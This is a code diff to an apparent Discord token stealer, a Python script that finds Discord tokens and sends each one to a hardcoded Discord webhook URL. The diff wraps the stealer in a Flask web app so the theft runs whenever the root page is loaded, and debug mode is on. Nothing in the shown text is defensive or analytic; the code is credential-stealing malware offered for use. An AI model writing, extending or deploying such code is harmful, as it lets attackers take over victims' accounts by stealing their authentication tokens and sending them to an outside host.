@@ -1,6 +1,10 @@
+from flask import Flask
+
 import os
 import re
 import requests
+
+app = Flask(__name__)
 
 WEBHOOK_URL = 'https://discord.com/api/webhooks/1255196642349416599/XhdAI4R7KifKEie66INdXq-E1L8jtAmO4hnn6Zkxjk5P9dZfJ-cotxTrKbEea8l87jGr'
 
@@ -30,5 +34,11 @@ def find_and_send_tokens():
                     send_message(f'Discord token found: {token}')
                     break
 
-if __name__ == '__main__':
+@app.route('/')
+def index():
+    # Run your script function when the page loads
     find_and_send_tokens()
+    return 'Script executed successfully!'
+
+if __name__ == '__main__':
+    app.run(debug=True)
